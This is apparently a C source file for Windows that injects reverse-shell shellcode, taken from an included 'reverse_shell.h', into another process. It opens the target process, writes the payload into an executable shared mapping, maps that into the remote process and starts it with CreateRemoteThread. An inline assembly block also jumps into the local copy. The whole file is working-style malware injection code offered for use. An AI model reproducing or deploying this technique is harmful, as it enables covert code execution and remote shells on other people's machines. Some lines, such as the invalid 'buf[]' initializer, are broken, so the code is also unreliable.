#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "reverse_shell.h"  // Assuming reverse_shell.h contains the shellcode

// Function to inject shellcode into a target process
int mapinject(int targetProcess)
{
    // Define the shellcode, assuming it's declared in reverse_shell.h
    unsigned char shellcode[] = buf[];
    
    // Print the target process ID
    printf("\nUsing PID %d\n", targetProcess);

    // Open the target process with necessary permissions
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, (DWORD)targetProcess);
    if (hProc == NULL)
    {
        printf("\nCannot open process with PID %d\n", targetProcess);
        return -1;
    }

    // Create a global file mapping object for the shellcode
    HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
    if (hFileMap == NULL)
    {
        printf("\nCreateFileMapping failed with error: %d\n", GetLastError());
        return -1;
    }
    printf("\nCreated global file mapping object\n");

    // Map the shellcode into the global file mapping object
    LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));
    if (lpMapAddress == NULL)
    {
        printf("\nMapViewOfFile failed with error: %d\n", GetLastError());
        return -1;
    }
    memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));
    printf("\nWritten %d bytes to the global mapping object\n", (DWORD)sizeof(shellcode));

    // Map the global file mapping object into the remote process
    LPVOID lpMapAddressRemote = MapViewOfFile2(hFileMap, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
    if (lpMapAddressRemote == NULL)
    {
        printf("\nMapViewOfFile2 failed with error: %d\n", GetLastError());
        return -1;
    }
    printf("\nInjected global object mapping to the remote process with pid %d\n", targetProcess);

    // Create a remote thread to execute the shellcode
    HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, lpMapAddressRemote, NULL, 0, NULL);
    if (hRemoteThread == NULL)
    {
        printf("\nCreateRemoteThread failed with error: %d\n", GetLastError());
        return -1;
    }
    printf("\nRemote Thread Started!\n");

    // Execute shellcode
    __asm 
    {
        mov eax, lpMapAddress
        push eax;
        ret
    }

    // Clean up resources
    UnmapViewOfFile(lpMapAddress);
    CloseHandle(hFileMap);

    return 0;
}
